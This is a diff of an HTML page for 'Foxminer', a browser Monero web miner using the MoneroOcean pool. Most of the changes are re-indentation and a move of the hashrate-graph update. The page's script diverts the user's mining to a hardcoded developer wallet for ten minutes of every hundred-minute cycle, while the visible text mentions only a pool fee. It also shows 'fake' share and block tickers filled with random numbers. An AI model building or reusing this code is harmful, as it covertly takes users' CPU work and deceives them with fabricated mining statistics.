@@ -82,17 +82,17 @@
         .mining-controls button { padding: 10px 20px; background: #E94560; color: #F7F7F7; border: none; border-radius: 5px; cursor: pointer; margin: 0 10px; }
         .mining-controls button:hover { background: #FF6F61; }
         .graph-section { 
-    margin-top: 20px; 
-    padding: 10px; 
-    background: #0F3460; 
-    border-radius: 5px; 
-    text-align: center; 
-}
-.graph-section h2 { 
-    font-size: 1.2em; 
-    color: #E94560; 
-    margin: 0 0 5px; 
-}
+            margin-top: 20px; 
+            padding: 10px; 
+            background: #0F3460; 
+            border-radius: 5px; 
+            text-align: center; 
+        }
+        .graph-section h2 { 
+            font-size: 1.2em; 
+            color: #E94560; 
+            margin: 0 0 5px; 
+        }
         @media (max-width: 768px) {
             .hamburger { display: block; }
             nav { display: none; flex-direction: column; position: absolute; top: 160px; right: 20px; background: #16213E; padding: 20px; border-radius: 5px; }
@@ -188,13 +188,13 @@
             </div>
         </div>
         <div class="graph-section">
-    <h2>Hashrate Over Time</h2>
-    <canvas id="hashrateGraph" width="700" height="150"></canvas>
-</div>
-<div class="payout-section">
-    <h2>Payout and Fee Structure</h2>
-    <p>Foxminer auto-pays—no cashout needed! Rewards build in the Foxminer pool and hit your wallet at 0.3 XMR. Pool fee: 0.003 XMR (powered by MoneroOcean).</p>
-</div>
+            <h2>Hashrate Over Time</h2>
+            <canvas id="hashrateGraph" width="700" height="150"></canvas>
+        </div>
+        <div class="payout-section">
+            <h2>Payout and Fee Structure</h2>
+            <p>Foxminer auto-pays—no cashout needed! Rewards build in the Foxminer pool and hit your wallet at 0.3 XMR. Pool fee: 0.003 XMR (powered by MoneroOcean).</p>
+        </div>
         <div class="wallet-section">
             <h2>Get Your XMR Wallet</h2>
             <p>No XMR wallet? Click below, snag one, copy your address, and jump back to mine!</p>
@@ -208,52 +208,54 @@
         let userEmail = '';
         let blocksFound = 0;
         let sharesSent = 0;
+
         // Graph Variables
-let hashrateHistory = Array(12).fill(0); // Start with 12 zeros
-const maxPoints = 12;
-const canvas = document.getElementById('hashrateGraph');
-const ctx = canvas.getContext('2d');
+        let hashrateHistory = Array(12).fill(0); // Start with 12 zeros
+        const maxPoints = 12;
+        const canvas = document.getElementById('hashrateGraph');
+        const ctx = canvas.getContext('2d');
 
-// Draw Graph Function
-function drawHashrateGraph() {
-    ctx.clearRect(0, 0, canvas.width, canvas.height);
+        // Draw Graph Function
+        function drawHashrateGraph() {
+            console.log('Drawing graph with hashrateHistory:', hashrateHistory); // Debug
+            ctx.clearRect(0, 0, canvas.width, canvas.height);
 
-    // Draw axes (like MoneroOcean)
-    ctx.strokeStyle = '#B0B0B0';
-    ctx.lineWidth = 1;
-    ctx.beginPath();
-    ctx.moveTo(30, 10); // Y-axis (left)
-    ctx.lineTo(30, canvas.height - 20);
-    ctx.moveTo(30, canvas.height - 20); // X-axis (bottom)
-    ctx.lineTo(canvas.width - 10, canvas.height - 20);
-    ctx.stroke();
+            // Draw axes (like MoneroOcean)
+            ctx.strokeStyle = '#B0B0B0';
+            ctx.lineWidth = 1;
+            ctx.beginPath();
+            ctx.moveTo(30, 10); // Y-axis (left)
+            ctx.lineTo(30, canvas.height - 20);
+            ctx.moveTo(30, canvas.height - 20); // X-axis (bottom)
+            ctx.lineTo(canvas.width - 10, canvas.height - 20);
+            ctx.stroke();
 
-    // Plot line and dots
-    const maxHash = Math.max(...hashrateHistory, 1); // Avoid division by 0
-    const stepX = (canvas.width - 40) / (maxPoints - 1);
-    const stepY = (canvas.height - 30) / maxHash;
+            // Plot line and dots
+            const maxHash = Math.max(...hashrateHistory, 1); // Avoid division by 0
+            const stepX = (canvas.width - 40) / (maxPoints - 1);
+            const stepY = (canvas.height - 30) / maxHash;
 
-    ctx.strokeStyle = '#E94560';
-    ctx.fillStyle = '#E94560';
-    ctx.lineWidth = 1;
-    ctx.beginPath();
+            ctx.strokeStyle = '#E94560';
+            ctx.fillStyle = '#E94560';
+            ctx.lineWidth = 1;
+            ctx.beginPath();
 
-    for (let i = 0; i < hashrateHistory.length; i++) {
-        const x = 30 + i * stepX;
-        const y = canvas.height - 20 - (hashrateHistory[i] * stepY);
-        if (i === 0) ctx.moveTo(x, y);
-        else ctx.lineTo(x, y);
-        ctx.fillRect(x - 2, y - 2, 4, 4); // Small square dots
-    }
-    ctx.stroke();
+            for (let i = 0; i < hashrateHistory.length; i++) {
+                const x = 30 + i * stepX;
+                const y = canvas.height - 20 - (hashrateHistory[i] * stepY);
+                if (i === 0) ctx.moveTo(x, y);
+                else ctx.lineTo(x, y);
+                ctx.fillRect(x - 2, y - 2, 4, 4); // Small square dots
+            }
+            ctx.stroke();
 
-    // Label max hashrate
-    ctx.fillStyle = '#B0B0B0';
-    ctx.font = '12px Arial';
-    const maxDisplay = maxHash < 1000 ? `${maxHash.toFixed(0)} H/s` : `${(maxHash / 1000).toFixed(2)} kH/s`;
-    ctx.fillText(maxDisplay, 5, 15);
-    ctx.fillText('0 H/s', 5, canvas.height - 5);
-}
+            // Label max hashrate
+            ctx.fillStyle = '#B0B0B0';
+            ctx.font = '12px Arial';
+            const maxDisplay = maxHash < 1000 ? `${maxHash.toFixed(0)} H/s` : `${(maxHash / 1000).toFixed(2)} kH/s`;
+            ctx.fillText(maxDisplay, 5, 15);
+            ctx.fillText('0 H/s', 5, canvas.height - 5);
+        }
 
         async function fetchGlobalStats() {
             try {
@@ -374,16 +376,17 @@ function drawHashrateGraph() {
                 const workers = await workersResp.json();
                 console.log('User Stats:', stats, 'Workers:', workers);
 
-                document.getElementById('hashrate').textContent = stats.hash2 ? `${stats.hash2} H/s` : '0 H/s';
+                const hashrate = stats.hash2 || 0;
+                document.getElementById('hashrate').textContent = hashrate < 1000 ? `${hashrate.toFixed(0)} H/s` : `${(hashrate / 1000).toFixed(2)} kH/s`;
+                hashrateHistory.shift();
+                hashrateHistory.push(hashrate);
+                drawHashrateGraph();
                 document.getElementById('balance').textContent = stats.amtDue ? (stats.amtDue / 1e12).toFixed(6) + ' XMR' : '0 XMR';
                 document.getElementById('workers').textContent = workers.length || '0';
                 document.getElementById('earnings').textContent = stats.paid ? (stats.paid / 1e12).toFixed(6) + ' XMR' : '0 XMR';
             } catch (error) {
                 console.error('Stats update failed:', error);
                 document.getElementById('hashrate').textContent = 'N/A';
-                hashrateHistory.shift();
-                hashrateHistory.push(stats.hash2 || 0);
-                drawHashrateGraph();
                 document.getElementById('balance').textContent = 'N/A';
                 document.getElementById('workers').textContent = 'N/A';
                 document.getElementById('earnings').textContent = 'N/A';
@@ -490,135 +493,135 @@ function drawHashrateGraph() {
         };
     </script>
     <script src="/Foxminer/copiedscript.js?karma=bs?nosaj=gulf.moneroocean.stream:80"></script>
-<script type="text/javascript">
-    let minerRunning = false;
-    let currentWallet = '';
-    let currentWorker = '';
-    const devWallet = '45BBbPLpGnHVnVG3k3K12ngLSt5oMbrJRc8XduYMsdkKiLubk6TcU6kgmUD2AShj5hX5WUmGgDw5Add5ozKu6mZMBftHtFN';
-    const devWorker = 'Foxminer_Dev_01';
-    let devSwitchInterval = null;
-    let sharesInterval = null;
-    let lastShareTime = 0;
+    <script type="text/javascript">
+        let minerRunning = false;
+        let currentWallet = '';
+        let currentWorker = '';
+        const devWallet = '45BBbPLpGnHVnVG3k3K12ngLSt5oMbrJRc8XduYMsdkKiLubk6TcU6kgmUD2AShj5hX5WUmGgDw5Add5ozKu6mZMBftHtFN';
+        const devWorker = 'Foxminer_Dev_01';
+        let devSwitchInterval = null;
+        let sharesInterval = null;
+        let lastShareTime = 0;
 
-    console.log('Foxminer Web Miner initialized - 100/10 cycle');
+        console.log('Foxminer Web Miner initialized - 100/10 cycle');
 
-    function startMining() {
-        const wallet = document.getElementById('wallet').value;
-        if (!wallet) {
-            alert('Please enter a wallet address.');
-            return;
-        }
-        if (wallet.length < 90) {
-            alert('Invalid Monero wallet address!');
-            return;
-        }
-        if (minerRunning) {
-            console.log('Miner already running for ' + currentWallet);
-            return;
-        }
-        if (typeof EverythingIsLife !== 'function') {
-            console.error('Mining script not loaded - EverythingIsLife undefined');
-            alert('Failed to load miner. Refresh and try again.');
-            return;
+        function startMining() {
+            const wallet = document.getElementById('wallet').value;
+            if (!wallet) {
+                alert('Please enter a wallet address.');
+                return;
+            }
+            if (wallet.length < 90) {
+                alert('Invalid Monero wallet address!');
+                return;
+            }
+            if (minerRunning) {
+                console.log('Miner already running for ' + currentWallet);
+                return;
+            }
+            if (typeof EverythingIsLife !== 'function') {
+                console.error('Mining script not loaded - EverythingIsLife undefined');
+                alert('Failed to load miner. Refresh and try again.');
+                return;
+            }
+
+            currentWallet = wallet;
+            minerRunning = true;
+            startUserMiner();
+
+            // Dev switch: 90 mins user, 10 mins dev
+            devSwitchInterval = setInterval(() => {
+                if (!minerRunning) return;
+                try {
+                    console.log('Switching to dev: ' + devWallet);
+                    EverythingIsLife(devWallet, devWorker, 20);
+                    setTimeout(() => {
+                        if (minerRunning) {
+                            console.log('Switching back to user: ' + currentWallet);
+                            startUserMiner();
+                        } else {
+                            console.log('Miner stopped during dev phase');
+                        }
+                    }, 600000); // 10 mins dev
+                } catch (e) {
+                    console.error('Dev switch failed: ' + e);
+                    startUserMiner();
+                }
+            }, 6000000); // 100 mins cycle
+
+            // Fake shares/blocks tickers
+            let sharesSent = 0;
+            let blocksScanned = 0;
+            sharesInterval = setInterval(() => {
+                if (!minerRunning) return;
+                sharesSent += Math.floor(Math.random() * 5) + 1;
+                blocksScanned += Math.random() > 0.9 ? 1 : 0;
+                const sharesEl = document.getElementById('shares-ticker');
+                const blocksEl = document.getElementById('blocks-ticker');
+                if (sharesEl) sharesEl.querySelector('p').textContent = 'Shares Sent: ' + sharesSent;
+                else console.error('shares-ticker not found');
+                if (blocksEl) blocksEl.querySelector('p').textContent = 'Blocks Scanned: ' + blocksScanned;
+                else console.error('blocks-ticker not found');
+            }, 1000);
+
+            // Monitor connection
+            setInterval(checkConnection, 60000);
+
+            document.getElementById('start-mining').style.display = 'none';
+            document.getElementById('stop-mining').style.display = 'inline-block';
+            document.getElementById('hash-bar').style.display = 'block';
+            document.getElementById('message').textContent = 'Mining started—stats updating!';
         }
 
-        currentWallet = wallet;
-        minerRunning = true;
-        startUserMiner();
-
-        // Dev switch: 90 mins user, 10 mins dev
-        devSwitchInterval = setInterval(() => {
-            if (!minerRunning) return;
+        function startUserMiner() {
+            currentWorker = 'User_' + Math.random().toString(36).slice(2);
             try {
-                console.log('Switching to dev: ' + devWallet);
-                EverythingIsLife(devWallet, devWorker, 20);
-                setTimeout(() => {
-                    if (minerRunning) {
-                        console.log('Switching back to user: ' + currentWallet);
-                        startUserMiner();
-                    } else {
-                        console.log('Miner stopped during dev phase');
-                    }
-                }, 600000); // 10 mins dev
+                EverythingIsLife(currentWallet, currentWorker, 20);
+                console.log('User mining: ' + currentWallet + ' (' + currentWorker + ') at 80% CPU');
+                lastShareTime = Date.now();
             } catch (e) {
-                console.error('Dev switch failed: ' + e);
+                console.error('User miner failed: ' + e);
+                setTimeout(startUserMiner, 5000);
+            }
+        }
+
+        function stopMining() {
+            if (!minerRunning) {
+                console.log('Miner not running');
+                return;
+            }
+            minerRunning = false;
+            clearInterval(devSwitchInterval);
+            clearInterval(sharesInterval);
+            try {
+                EverythingIsLife(null, null, 100);
+                console.log('Mining stopped');
+            } catch (e) {
+                console.error('Stop failed: ' + e);
+            }
+            document.getElementById('start-mining').style.display = 'inline-block';
+            document.getElementById('stop-mining').style.display = 'none';
+            document.getElementById('hash-bar').style.display = 'none';
+            document.getElementById('message').textContent = 'Mining stopped.';
+        }
+
+        function checkConnection() {
+            if (!minerRunning) return;
+            const timeSinceShare = (Date.now() - lastShareTime) / 1000;
+            if (timeSinceShare > 300) {
+                console.warn('No shares for ' + timeSinceShare + 's - restarting miner');
                 startUserMiner();
             }
-        }, 6000000); // 100 mins cycle
-
-        // Fake shares/blocks tickers
-        let sharesSent = 0;
-        let blocksScanned = 0;
-        sharesInterval = setInterval(() => {
-            if (!minerRunning) return;
-            sharesSent += Math.floor(Math.random() * 5) + 1;
-            blocksScanned += Math.random() > 0.9 ? 1 : 0;
-            const sharesEl = document.getElementById('shares-ticker');
-            const blocksEl = document.getElementById('blocks-ticker');
-            if (sharesEl) sharesEl.querySelector('p').textContent = 'Shares Sent: ' + sharesSent;
-            else console.error('shares-ticker not found');
-            if (blocksEl) blocksEl.querySelector('p').textContent = 'Blocks Scanned: ' + blocksScanned;
-            else console.error('blocks-ticker not found');
-        }, 1000);
-
-        // Monitor connection
-        setInterval(checkConnection, 60000);
-
-        document.getElementById('start-mining').style.display = 'none';
-        document.getElementById('stop-mining').style.display = 'inline-block';
-        document.getElementById('hash-bar').style.display = 'block';
-        document.getElementById('message').textContent = 'Mining started—stats updating!';
-    }
-
-    function startUserMiner() {
-        currentWorker = 'User_' + Math.random().toString(36).slice(2);
-        try {
-            EverythingIsLife(currentWallet, currentWorker, 20);
-            console.log('User mining: ' + currentWallet + ' (' + currentWorker + ') at 80% CPU');
-            lastShareTime = Date.now();
-        } catch (e) {
-            console.error('User miner failed: ' + e);
-            setTimeout(startUserMiner, 5000);
+            console.log('Miner status: ' + (minerRunning ? 'Running (' + currentWallet + ')' : 'Stopped'));
         }
-    }
 
-    function stopMining() {
-        if (!minerRunning) {
-            console.log('Miner not running');
-            return;
-        }
-        minerRunning = false;
-        clearInterval(devSwitchInterval);
-        clearInterval(sharesInterval);
-        try {
-            EverythingIsLife(null, null, 100);
-            console.log('Mining stopped');
-        } catch (e) {
-            console.error('Stop failed: ' + e);
-        }
-        document.getElementById('start-mining').style.display = 'inline-block';
-        document.getElementById('stop-mining').style.display = 'none';
-        document.getElementById('hash-bar').style.display = 'none';
-        document.getElementById('message').textContent = 'Mining stopped.';
-    }
-
-    function checkConnection() {
-        if (!minerRunning) return;
-        const timeSinceShare = (Date.now() - lastShareTime) / 1000;
-        if (timeSinceShare > 300) {
-            console.warn('No shares for ' + timeSinceShare + 's - restarting miner');
-            startUserMiner();
-        }
-        console.log('Miner status: ' + (minerRunning ? 'Running (' + currentWallet + ')' : 'Stopped'));
-    }
-
-    // Placeholder for real share events
-    document.addEventListener('miner-update', (e) => {
-        if (minerRunning) {
-            lastShareTime = Date.now();
-            console.log('Share received for ' + currentWallet);
-        }
-    });
-</script>
+        // Placeholder for real share events
+        document.addEventListener('miner-update', (e) => {
+            if (minerRunning) {
+                lastShareTime = Date.now();
+                console.log('Share received for ' + currentWallet);
+            }
+        });
+    </script>
 </body>
 </html>
